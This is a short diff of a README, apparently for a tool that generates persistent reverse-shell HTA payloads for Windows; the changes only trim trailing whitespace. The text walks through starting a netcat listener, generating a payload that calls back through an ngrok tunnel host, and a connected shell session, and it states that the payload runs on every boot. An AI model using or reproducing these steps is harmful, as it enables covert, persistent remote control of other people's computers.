@@ -15,8 +15,8 @@ then we run netcat to listen on port 3333
 ```
 nc -nvlp 3333
 ```
-### creating payload 
-Now we can create out payload with our ngrok tunnel's domain and port 
+### creating payload
+Now we can create out payload with our ngrok tunnel's domain and port
 ```
 python.exe generator.py 8.tcp.ngrok.io 18053 payload.hta
 ```
@@ -28,6 +28,6 @@ listening on [any] 3333 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50662
 > echo hello
 hello
-> 
+>
 ```
 this reverse shell is persistent meaning every time you boot the windows the payload will execute
